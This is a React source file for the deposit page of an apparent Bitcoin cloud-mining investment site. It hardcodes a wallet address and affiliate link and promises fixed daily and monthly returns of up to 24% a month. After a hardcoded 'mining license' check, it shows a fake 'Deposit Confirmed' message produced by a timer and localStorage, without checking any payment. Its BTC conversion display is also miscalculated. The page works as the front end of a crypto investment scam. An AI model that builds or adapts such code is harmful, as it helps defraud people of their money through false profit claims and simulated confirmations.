import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Bitcoin, Copy, ExternalLink, ChevronRight, ArrowRight, Check, Play, Key } from 'lucide-react';
import { toast } from '@/hooks/use-toast';
import { useAuth } from '@/context/AuthContext';
import Navbar from '../components/layout/Navbar';
import Footer from '../components/layout/Footer';
import Button from '../components/shared/Button';
import Card from '../components/shared/Card';
import { Input } from "@/components/ui/input";

const WALLET_ADDRESS = 'bc1qcm6wmwk47q35axp75gvkwsnhrsfvwks3yf6sqd';
const EXTERNAL_PROVIDER_URL = 'https://paybis.com/?refId=23046';
const CORRECT_LICENSE = 'XbfYwwQ57Y';

const depositOptions = [
  { amount: 250, dailyReturn: '0.5%', monthlyReturn: '15%', recommended: false },
  { amount: 500, dailyReturn: '0.6%', monthlyReturn: '18%', recommended: false },
  { amount: 1000, dailyReturn: '0.7%', monthlyReturn: '21%', recommended: true },
  { amount: 2000, dailyReturn: '0.8%', monthlyReturn: '24%', recommended: false },
];

const Deposit: React.FC = () => {
  const navigate = useNavigate();
  const { isLoggedIn } = useAuth();
  const [selectedAmount, setSelectedAmount] = useState(1000);
  const [depositConfirmed, setDepositConfirmed] = useState(false);
  const [confirmingDeposit, setConfirmingDeposit] = useState(false);
  const [copied, setCopied] = useState(false);
  
  // License verification modal state
  const [showLicenseModal, setShowLicenseModal] = useState(false);
  const [licenseKey, setLicenseKey] = useState('');
  const [licenseError, setLicenseError] = useState('');
  
  useEffect(() => {
    // Check if user is logged in
    if (!isLoggedIn) {
      toast({
        title: "Authentication Required",
        description: "Please log in to access the deposit page.",
        variant: "destructive",
      });
      setTimeout(() => navigate('/'), 1000);
    }
    
    // Check if user has already deposited
    const hasDeposited = localStorage.getItem('hasDeposited') === 'true';
    if (hasDeposited) {
      setDepositConfirmed(true);
      setSelectedAmount(Number(localStorage.getItem('depositAmount')) || 1000);
    }
  }, [isLoggedIn, navigate]);
  
  const copyToClipboard = () => {
    navigator.clipboard.writeText(WALLET_ADDRESS);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    
    toast({
      title: "Address Copied",
      description: "Bitcoin wallet address copied to clipboard!",
    });
  };
  
  const handleExternalProviderClick = () => {
    toast({
      title: "Redirecting",
      description: "Taking you to our partner exchange...",
    });
    window.open(EXTERNAL_PROVIDER_URL, '_blank');
  };
  
  const handleSentBitcoinClick = () => {
    setShowLicenseModal(true);
    setLicenseError('');
    setLicenseKey('');
  };
  
  const handleVerifyLicense = () => {
    if (licenseKey === CORRECT_LICENSE) {
      setShowLicenseModal(false);
      setLicenseError('');
      
      // Store license in localStorage
      localStorage.setItem('miningLicense', licenseKey);
      
      // Continue with deposit confirmation
      simulateDepositConfirmation();
    } else {
      setLicenseError('Invalid License. Please enter a valid mining license.');
      toast({
        title: "License Error",
        description: "The mining license you entered is invalid.",
        variant: "destructive",
      });
    }
  };
  
  const simulateDepositConfirmation = () => {
    setConfirmingDeposit(true);
    
    // Simulated blockchain confirmation delay
    setTimeout(() => {
      setDepositConfirmed(true);
      setConfirmingDeposit(false);
      
      // Save to localStorage
      localStorage.setItem('hasDeposited', 'true');
      localStorage.setItem('depositAmount', selectedAmount.toString());
      localStorage.setItem('depositDate', new Date().toISOString());
      
      toast({
        title: "Deposit Confirmed!",
        description: "Your mining process has started. Redirecting to dashboard...",
      });
      
      // Redirect to dashboard after confirmation
      setTimeout(() => {
        navigate('/dashboard');
      }, 2000);
    }, 3000);
  };
  
  const closeLicenseModal = () => {
    setShowLicenseModal(false);
    setLicenseError('');
  };
  
  if (!isLoggedIn) {
    return (
      <div className="min-h-screen flex flex-col">
        <Navbar />
        <main className="flex-grow flex items-center justify-center">
          <Card variant="glass" className="p-8 text-center">
            <h2 className="text-2xl font-bold mb-4">Authentication Required</h2>
            <p className="text-muted-foreground mb-6">Please log in to access the deposit page.</p>
            <Button onClick={() => navigate('/')}>
              Return to Home Page
            </Button>
          </Card>
        </main>
        <Footer />
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col">
      <Navbar />
      <main className="flex-grow pt-24 pb-16">
        <div className="container mx-auto px-4 max-w-5xl">
          <div className="mb-8">
            <h1 className="text-3xl md:text-4xl font-bold mb-4">
              {depositConfirmed ? 'Upgrade Mining Power' : 'Start Mining Bitcoin'}
            </h1>
            <p className="text-muted-foreground">
              {depositConfirmed 
                ? 'Increase your mining power by making an additional deposit. The more you invest, the higher your returns.'
                : 'To start mining, you need to pay a mining fee. The amount you deposit determines your mining power and potential returns.'}
            </p>
          </div>
          
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
            <div className="lg:col-span-2">
              <Card className="p-6 mb-8">
                <h2 className="text-xl font-semibold mb-6">
                  {depositConfirmed ? 'Select Upgrade Amount' : 'Select Mining Fee Amount'}
                </h2>
                <p className="text-muted-foreground mb-4">
                  Choose how much you want to deposit. Higher deposits provide greater mining power and higher returns.
                  Our minimum mining fee is $250 in Bitcoin equivalent.
                </p>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-8">
                  {depositOptions.map((option) => (
                    <button
                      key={option.amount}
                      className={`relative p-4 rounded-lg border ${
                        selectedAmount === option.amount 
                          ? 'border-primary bg-primary/10' 
                          : 'border-border bg-secondary/30'
                      } transition-all hover:border-primary/70`}
                      onClick={() => setSelectedAmount(option.amount)}
                    >
                      {option.recommended && (
                        <div className="absolute -top-3 right-4 px-2 py-0.5 bg-primary text-primary-foreground text-xs font-medium rounded-full">
                          Recommended
                        </div>
                      )}
                      <div className="text-2xl font-bold mb-2">${option.amount}</div>
                      <div className="flex flex-col gap-1 text-sm">
                        <div className="flex justify-between">
                          <span className="text-muted-foreground">Daily Return:</span>
                          <span className="font-medium text-green-400">{option.dailyReturn}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-muted-foreground">Monthly Return:</span>
                          <span className="font-medium text-green-400">{option.monthlyReturn}</span>
                        </div>
                      </div>
                    </button>
                  ))}
                </div>
                
                <div className="space-y-6">
                  <Card variant="outlined" className="p-4 bg-muted/30">
                    <h3 className="font-semibold mb-2">Deposit Summary</h3>
                    <div className="flex justify-between mb-2">
                      <span className="text-muted-foreground">Selected amount:</span>
                      <span className="font-medium">${selectedAmount}</span>
                    </div>
                    <div className="flex justify-between mb-2">
                      <span className="text-muted-foreground">Daily return:</span>
                      <span className="font-medium text-green-400">
                        {depositOptions.find(o => o.amount === selectedAmount)?.dailyReturn}
                      </span>
                    </div>
                    <div className="flex justify-between mb-2">
                      <span className="text-muted-foreground">Monthly return:</span>
                      <span className="font-medium text-green-400">
                        {depositOptions.find(o => o.amount === selectedAmount)?.monthlyReturn}
                      </span>
                    </div>
                    <div className="flex justify-between pt-2 border-t border-border">
                      <span className="text-muted-foreground">BTC Equivalent (approx):</span>
                      <span className="font-medium text-bitcoin">≈ 0.00{(selectedAmount/40000).toFixed(4)} BTC</span>
                    </div>
                  </Card>
                </div>
              </Card>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <Card className="p-6 flex flex-col h-full">
                  <div className="mb-4 p-3 inline-flex rounded-full bg-bitcoin/10 text-bitcoin">
                    <Bitcoin size={24} />
                  </div>
                  <h3 className="text-lg font-semibold mb-2">Send Bitcoin Directly</h3>
                  <p className="text-muted-foreground mb-4 flex-grow">
                    Send BTC equivalent of ${selectedAmount} to our mining pool address to start mining instantly.
                  </p>
                  
                  <div className="bg-muted/30 p-3 rounded-lg mb-4">
                    <div className="flex items-center justify-between gap-2">
                      <code className="text-xs md:text-sm font-mono overflow-x-auto whitespace-nowrap">
                        {WALLET_ADDRESS}
                      </code>
                      <button
                        className="p-2 bg-secondary rounded hover:bg-secondary/70 transition-colors flex-shrink-0"
                        onClick={copyToClipboard}
                        aria-label="Copy address"
                      >
                        {copied ? <Check size={16} className="text-green-400" /> : <Copy size={16} />}
                      </button>
                    </div>
                  </div>
                  
                  <div className="space-y-3">
                    <Button leftIcon={<Bitcoin size={18} />} onClick={copyToClipboard} fullWidth>
                      {copied ? "Address Copied!" : "Copy Wallet Address"}
                    </Button>
                    
                    <Button 
                      variant="secondary" 
                      fullWidth
                      disabled={confirmingDeposit}
                      onClick={handleSentBitcoinClick}
                    >
                      {confirmingDeposit ? (
                        <>
                          <div className="animate-spin mr-2 h-4 w-4 border-2 border-current border-t-transparent rounded-full"></div>
                          Confirming Deposit...
                        </>
                      ) : (
                        "I've Sent the Bitcoin"
                      )}
                    </Button>
                  </div>
                </Card>
                
                <Card className="p-6 flex flex-col h-full">
                  <div className="mb-4 p-3 inline-flex rounded-full bg-primary/10 text-primary">
                    <ExternalLink size={24} />
                  </div>
                  <h3 className="text-lg font-semibold mb-2">Use Exchange Partner</h3>
                  <p className="text-muted-foreground mb-4 flex-grow">
                    Don't have Bitcoin yet? Buy BTC through our trusted exchange partner and deposit directly.
                  </p>
                  
                  <Button 
                    variant="accent" 
                    rightIcon={<ArrowRight size={18} />}
                    onClick={handleExternalProviderClick}
                    fullWidth
                  >
                    Buy Bitcoin Now
                  </Button>
                </Card>
              </div>
            </div>
            
            <div className="lg:col-span-1">
              <Card className="p-6 sticky top-24">
                <h3 className="text-xl font-semibold mb-4">Mining Benefits</h3>
                
                <ul className="space-y-4">
                  {[
                    {
                      title: "Daily Profits",
                      description: "Earn Bitcoin every day based on your mining power."
                    },
                    {
                      title: "No Technical Knowledge",
                      description: "We handle all the complex mining setup and maintenance."
                    },
                    {
                      title: "Referral Program",
                      description: "Earn 10% commission from friends you refer."
                    },
                    {
                      title: "Withdraw Anytime",
                      description: "Access your earnings 24/7 with no lockup period."
                    },
                    {
                      title: "No Hardware Costs",
                      description: "No need to purchase expensive mining equipment."
                    }
                  ].map((benefit, index) => (
                    <li key={index} className="flex gap-3">
                      <div className="flex-shrink-0 h-6 w-6 rounded-full bg-green-400/20 text-green-400 flex items-center justify-center">
                        <ChevronRight size={16} />
                      </div>
                      <div>
                        <h4 className="font-medium">{benefit.title}</h4>
                        <p className="text-sm text-muted-foreground">{benefit.description}</p>
                      </div>
                    </li>
                  ))}
                </ul>
                
                {depositConfirmed && (
                  <div className="mt-6 pt-4 border-t border-border">
                    <div className="px-4 py-3 rounded-lg bg-green-400/10 border border-green-400/20 mb-4">
                      <div className="flex items-center text-green-400 mb-1">
                        <Check size={16} className="mr-2" />
                        <span className="font-medium">Active Mining Account</span>
                      </div>
                      <p className="text-sm text-muted-foreground">
                        Your mining is active. You can check your earnings on the dashboard.
                      </p>
                    </div>
                  </div>
                )}
                
                <div className="mt-6 pt-6 border-t border-border">
                  <div className="text-center">
                    <p className="text-sm text-muted-foreground mb-4">
                      Questions about depositing? Our support team is here to help.
                    </p>
                    <Button variant="outline" fullWidth>
                      Contact Support
                    </Button>
                  </div>
                </div>
              </Card>
            </div>
          </div>
        </div>
      </main>
      <Footer />
      
      {/* License Verification Modal */}
      {showLicenseModal && (
        <div className="fixed inset-0 flex items-center justify-center z-50 bg-black/50 backdrop-blur-sm">
          <div className="bg-card border border-border rounded-xl shadow-xl p-6 max-w-md w-full animate-fade-in">
            <h3 className="text-xl font-semibold mb-2">Mining License Required</h3>
            
            <p className="text-muted-foreground mb-6">
              Enter your mining license to verify your deposit and activate your mining account.
              <br/><br/>
            </p>
            
            <div className="space-y-4">
              <div>
                <label htmlFor="license" className="block text-sm font-medium mb-1">
                  Enter Your Mining License
                </label>
                <div className="flex gap-2">
                  <div className="relative flex-grow">
                    <Key className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
                    <Input
                      id="license"
                      type="text"
                      value={licenseKey}
                      onChange={(e) => setLicenseKey(e.target.value)}
                      placeholder="Enter your license key"
                      className="pl-9 w-full"
                    />
                  </div>
                </div>
                {licenseError && (
                  <p className="text-red-500 text-sm mt-1">{licenseError}</p>
                )}
              </div>
              
              <div className="flex items-center justify-end gap-3 pt-2">
                <Button
                  variant="outline"
                  onClick={closeLicenseModal}
                >
                  Cancel
                </Button>
                <Button
                  onClick={handleVerifyLicense}
                  rightIcon={<Play size={16} />}
                  className={`bg-[#FFD700] hover:bg-[#F5CB00] text-black font-semibold ${licenseKey === CORRECT_LICENSE ? 'animate-pulse' : ''}`}
                >
                  VERIFY LICENSE & START MINING
                </Button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default Deposit;
